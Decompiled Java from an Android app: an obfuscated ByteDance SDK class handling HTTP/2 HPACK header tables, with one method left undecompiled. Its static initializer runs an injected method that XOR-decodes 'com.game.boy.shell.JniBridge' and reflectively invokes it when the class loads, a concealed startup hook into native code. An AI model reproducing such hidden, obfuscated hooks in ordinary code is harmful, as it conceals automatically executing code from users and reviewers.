package com.bytedance.sdk.component.w.hf.xj.kd;

import com.baidu.mobads.sdk.internal.an;
import com.baidu.mobads.sdk.internal.cm;
import com.bytedance.sdk.component.w.xj.v;
import com.czhj.sdk.common.Constants;
import com.sigmob.sdk.base.views.r;
import com.sigmob.sdk.downloader.f;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes.dex */
final class u {
    static final Map<com.bytedance.sdk.component.w.xj.y, Integer> hf;
    static final w[] xj;

    public static final class hf {
        private final com.bytedance.sdk.component.w.xj.w c;
        private int d;
        private final boolean f;
        int hf;
        int kd;
        private boolean tf;
        int u;
        w[] w;
        int xj;
        int y;

        public hf(com.bytedance.sdk.component.w.xj.w wVar) {
            this(f.a.c, true, wVar);
        }

        private int hf(int i) {
            int i2;
            int i3 = 0;
            if (i > 0) {
                int length = this.w.length;
                while (true) {
                    length--;
                    i2 = this.u;
                    if (length < i2 || i <= 0) {
                        break;
                    }
                    int i4 = this.w[length].d;
                    i -= i4;
                    this.y -= i4;
                    this.kd--;
                    i3++;
                }
                w[] wVarArr = this.w;
                System.arraycopy(wVarArr, i2 + 1, wVarArr, i2 + 1 + i3, this.kd);
                w[] wVarArr2 = this.w;
                int i5 = this.u;
                Arrays.fill(wVarArr2, i5 + 1, i5 + 1 + i3, (Object) null);
                this.u += i3;
            }
            return i3;
        }

        private void xj() {
            Arrays.fill(this.w, (Object) null);
            this.u = this.w.length - 1;
            this.kd = 0;
            this.y = 0;
        }

        public hf(int i, boolean z, com.bytedance.sdk.component.w.xj.w wVar) {
            this.d = Integer.MAX_VALUE;
            this.w = new w[8];
            this.u = r0.length - 1;
            this.kd = 0;
            this.y = 0;
            this.xj = i;
            this.hf = i;
            this.f = z;
            this.c = wVar;
        }

        private void xj(w wVar) {
            int i = wVar.d;
            int i2 = this.hf;
            if (i > i2) {
                xj();
                return;
            }
            hf((this.y + i) - i2);
            int i3 = this.kd + 1;
            w[] wVarArr = this.w;
            if (i3 > wVarArr.length) {
                w[] wVarArr2 = new w[wVarArr.length * 2];
                System.arraycopy(wVarArr, 0, wVarArr2, wVarArr.length, wVarArr.length);
                this.u = this.w.length - 1;
                this.w = wVarArr2;
            }
            int i4 = this.u;
            this.u = i4 - 1;
            this.w[i4] = wVar;
            this.kd++;
            this.y += i;
        }

        private void hf() {
            int i = this.hf;
            int i2 = this.y;
            if (i < i2) {
                if (i == 0) {
                    xj();
                } else {
                    hf(i2 - i);
                }
            }
        }

        /* JADX WARN: Removed duplicated region for block: B:19:0x0070  */
        /* JADX WARN: Removed duplicated region for block: B:35:0x00a8  */
        /* JADX WARN: Removed duplicated region for block: B:38:0x00b0  */
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct add '--show-bad-code' argument
        */
        public void xj(java.util.List<com.bytedance.sdk.component.w.hf.xj.kd.w> r14) {
            /*
                Method dump skipped, instructions count: 236
                To view this dump add '--comments-level debug' option
            */
            throw new UnsupportedOperationException("Method not decompiled: com.bytedance.sdk.component.w.hf.xj.kd.u.hf.xj(java.util.List):void");
        }

        public void xj(int i, int i2, int i3) {
            if (i < i2) {
                this.c.d(i | i3);
                return;
            }
            this.c.d(i3 | i2);
            int i4 = i - i2;
            while (i4 >= 128) {
                this.c.d(128 | (i4 & 127));
                i4 >>>= 7;
            }
            this.c.d(i4);
        }

        public void xj(com.bytedance.sdk.component.w.xj.y yVar) {
            if (this.f && p.xj().xj(yVar) < yVar.c()) {
                com.bytedance.sdk.component.w.xj.w wVar = new com.bytedance.sdk.component.w.xj.w();
                p.xj().xj(yVar, wVar);
                com.bytedance.sdk.component.w.xj.y am = wVar.am();
                xj(am.c(), 127, r.b.d);
                this.c.hf(am);
                return;
            }
            xj(yVar.c(), 127, 0);
            this.c.hf(yVar);
        }

        public void xj(int i) {
            this.xj = i;
            int min = Math.min(i, f.a.d);
            int i2 = this.hf;
            if (i2 == min) {
                return;
            }
            if (min < i2) {
                this.d = Math.min(this.d, min);
            }
            this.tf = true;
            this.hf = min;
            hf();
        }
    }

    public static final class xj {
        private final int c;
        private int f;
        int hf;
        private final List<w> kd;
        int u;
        int w;
        w[] xj;
        private final com.bytedance.sdk.component.w.xj.kd y;

        public xj(int i, v vVar) {
            this(i, i, vVar);
        }

        private void c() {
            xj(-1, new w(u.xj(w()), w()));
        }

        private int f() {
            return this.y.f() & 255;
        }

        private void kd() {
            Arrays.fill(this.xj, (Object) null);
            this.hf = this.xj.length - 1;
            this.w = 0;
            this.u = 0;
        }

        private void u() {
            int i = this.f;
            int i2 = this.u;
            if (i < i2) {
                if (i == 0) {
                    kd();
                } else {
                    xj(i2 - i);
                }
            }
        }

        private int w(int i) {
            return this.hf + 1 + i;
        }

        private int xj(int i) {
            int i2;
            int i3 = 0;
            if (i > 0) {
                int length = this.xj.length;
                while (true) {
                    length--;
                    i2 = this.hf;
                    if (length < i2 || i <= 0) {
                        break;
                    }
                    int i4 = this.xj[length].d;
                    i -= i4;
                    this.u -= i4;
                    this.w--;
                    i3++;
                }
                w[] wVarArr = this.xj;
                System.arraycopy(wVarArr, i2 + 1, wVarArr, i2 + 1 + i3, this.w);
                this.hf += i3;
            }
            return i3;
        }

        private void y() {
            this.kd.add(new w(u.xj(w()), w()));
        }

        public List<w> hf() {
            ArrayList arrayList = new ArrayList(this.kd);
            this.kd.clear();
            return arrayList;
        }

        public xj(int i, int i2, v vVar) {
            this.kd = new ArrayList();
            this.xj = new w[8];
            this.hf = r0.length - 1;
            this.w = 0;
            this.u = 0;
            this.c = i;
            this.f = i2;
            this.y = com.bytedance.sdk.component.w.xj.pl.xj(vVar);
        }

        public com.bytedance.sdk.component.w.xj.y w() {
            int f = f();
            boolean z = (f & r.b.d) == 128;
            int xj = xj(f, 127);
            return z ? com.bytedance.sdk.component.w.xj.y.xj(p.xj().xj(this.y.c(xj))) : this.y.w(xj);
        }

        private void hf(int i) {
            if (c(i)) {
                this.kd.add(u.xj[i]);
                return;
            }
            int w = w(i - u.xj.length);
            if (w >= 0) {
                w[] wVarArr = this.xj;
                if (w <= wVarArr.length - 1) {
                    this.kd.add(wVarArr[w]);
                    return;
                }
            }
            throw new IOException("Header index too large " + (i + 1));
        }

        private boolean c(int i) {
            return i >= 0 && i <= u.xj.length - 1;
        }

        private void u(int i) {
            this.kd.add(new w(y(i), w()));
        }

        private com.bytedance.sdk.component.w.xj.y y(int i) {
            if (c(i)) {
                return u.xj[i].c;
            }
            return this.xj[w(i - u.xj.length)].c;
        }

        private void kd(int i) {
            xj(-1, new w(y(i), w()));
        }

        public void xj() {
            while (!this.y.kd()) {
                byte f = this.y.f();
                int i = f & 255;
                if (i == 128) {
                    throw new IOException("index == 0");
                }
                if ((f & 128) == 128) {
                    hf(xj(i, 127) - 1);
                } else if (i == 64) {
                    c();
                } else if ((f & 64) == 64) {
                    kd(xj(i, 63) - 1);
                } else if ((f & 32) == 32) {
                    int xj = xj(i, 31);
                    this.f = xj;
                    if (xj >= 0 && xj <= this.c) {
                        u();
                    } else {
                        throw new IOException("Invalid dynamic table size update " + this.f);
                    }
                } else if (i != 16 && i != 0) {
                    u(xj(i, 15) - 1);
                } else {
                    y();
                }
            }
        }

        private void xj(int i, w wVar) {
            this.kd.add(wVar);
            int i2 = wVar.d;
            if (i != -1) {
                i2 -= this.xj[w(i)].d;
            }
            int i3 = this.f;
            if (i2 > i3) {
                kd();
                return;
            }
            int xj = xj((this.u + i2) - i3);
            if (i == -1) {
                int i4 = this.w + 1;
                w[] wVarArr = this.xj;
                if (i4 > wVarArr.length) {
                    w[] wVarArr2 = new w[wVarArr.length * 2];
                    System.arraycopy(wVarArr, 0, wVarArr2, wVarArr.length, wVarArr.length);
                    this.hf = this.xj.length - 1;
                    this.xj = wVarArr2;
                }
                int i5 = this.hf;
                this.hf = i5 - 1;
                this.xj[i5] = wVar;
                this.w++;
            } else {
                this.xj[w(i) + xj + i] = wVar;
            }
            this.u += i2;
        }

        public int xj(int i, int i2) {
            int i3 = i & i2;
            if (i3 < i2) {
                return i3;
            }
            int i4 = 0;
            while (true) {
                int f = f();
                if ((f & r.b.d) == 0) {
                    return i2 + (f << i4);
                }
                i2 += (f & 127) << i4;
                i4 += 7;
            }
        }
    }

    static {
        w wVar = new w(w.y, "");
        com.bytedance.sdk.component.w.xj.y yVar = w.w;
        w wVar2 = new w(yVar, an.c);
        w wVar3 = new w(yVar, an.b);
        com.bytedance.sdk.component.w.xj.y yVar2 = w.u;
        w wVar4 = new w(yVar2, "/");
        w wVar5 = new w(yVar2, "/index.html");
        com.bytedance.sdk.component.w.xj.y yVar3 = w.kd;
        w wVar6 = new w(yVar3, Constants.HTTP);
        w wVar7 = new w(yVar3, "https");
        com.bytedance.sdk.component.w.xj.y yVar4 = w.hf;
        xj = new w[]{wVar, wVar2, wVar3, wVar4, wVar5, wVar6, wVar7, new w(yVar4, "200"), new w(yVar4, "204"), new w(yVar4, "206"), new w(yVar4, "304"), new w(yVar4, "400"), new w(yVar4, cm.b), new w(yVar4, "500"), new w("accept-charset", ""), new w("accept-encoding", "gzip, deflate"), new w("accept-language", ""), new w("accept-ranges", ""), new w("accept", ""), new w("access-control-allow-origin", ""), new w("age", ""), new w("allow", ""), new w("authorization", ""), new w("cache-control", ""), new w("content-disposition", ""), new w("content-encoding", ""), new w("content-language", ""), new w("content-length", ""), new w("content-location", ""), new w("content-range", ""), new w("content-type", ""), new w("cookie", ""), new w("date", ""), new w(com.sigmob.sdk.downloader.core.breakpoint.f.c, ""), new w("expect", ""), new w("expires", ""), new w("from", ""), new w("host", ""), new w("if-match", ""), new w("if-modified-since", ""), new w("if-none-match", ""), new w("if-range", ""), new w("if-unmodified-since", ""), new w("last-modified", ""), new w("link", ""), new w("location", ""), new w("max-forwards", ""), new w("proxy-authenticate", ""), new w("proxy-authorization", ""), new w("range", ""), new w("referer", ""), new w("refresh", ""), new w("retry-after", ""), new w("server", ""), new w("set-cookie", ""), new w("strict-transport-security", ""), new w("transfer-encoding", ""), new w("user-agent", ""), new w("vary", ""), new w("via", ""), new w("www-authenticate", "")};
        hf = xj();
        LDIl();
    }

    private static /* synthetic */ void LDIl() {
        char[] charArray = "6:8{2480{7:,{&=099{\u001f;<\u0017'<120".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ 'U');
        }
        String str = new String(charArray);
        char[] charArray2 = "69<;<!".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ 'U');
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }

    private static Map<com.bytedance.sdk.component.w.xj.y, Integer> xj() {
        LinkedHashMap linkedHashMap = new LinkedHashMap(xj.length);
        int i = 0;
        while (true) {
            w[] wVarArr = xj;
            if (i >= wVarArr.length) {
                return Collections.unmodifiableMap(linkedHashMap);
            }
            if (!linkedHashMap.containsKey(wVarArr[i].c)) {
                linkedHashMap.put(wVarArr[i].c, Integer.valueOf(i));
            }
            i++;
        }
    }

    public static com.bytedance.sdk.component.w.xj.y xj(com.bytedance.sdk.component.w.xj.y yVar) {
        int c = yVar.c();
        for (int i = 0; i < c; i++) {
            byte xj2 = yVar.xj(i);
            if (xj2 >= 65 && xj2 <= 90) {
                throw new IOException("PROTOCOL_ERROR response malformed: mixed case name: " + yVar.xj());
            }
        }
        return yVar;
    }
}
